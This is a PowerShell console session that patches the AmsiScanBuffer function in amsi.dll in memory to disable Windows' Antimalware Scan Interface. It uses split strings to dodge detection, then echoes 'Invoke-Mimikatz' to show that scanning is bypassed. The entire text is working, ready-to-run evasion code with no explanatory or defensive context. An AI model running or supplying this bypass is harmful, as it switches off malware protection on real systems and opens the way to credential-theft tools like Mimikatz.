PS C:\Users\grego> $blarg = @"
using System;
using System.Runtime.InteropServices;

public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@

PS C:\Users\grego> Add-Type $blarg
PS C:\Users\grego> $amsiDll = [WinApi]::LoadLibrary("amsi.dll")
PS C:\Users\grego> $asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
PS C:\Users\grego> $a = "0xB8"
PS C:\Users\grego> $b = "0x57"
PS C:\Users\grego> $c = "0x00"
PS C:\Users\grego> $d = "0x07"
PS C:\Users\grego> $e = "0x80"
PS C:\Users\grego> $f = "0xC3"
PS C:\Users\grego> $ret = [Byte[]] ( $a,$b,$c,$d,$e,$f )
PS C:\Users\grego> $out = 0
PS C:\Users\grego> [WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
True
PS C:\Users\grego> [System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
PS C:\Users\grego> [WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)
True
PS C:\Users\grego> "Invoke-Mimikatz"
Invoke-Mimikatz
PS C:\Users\grego>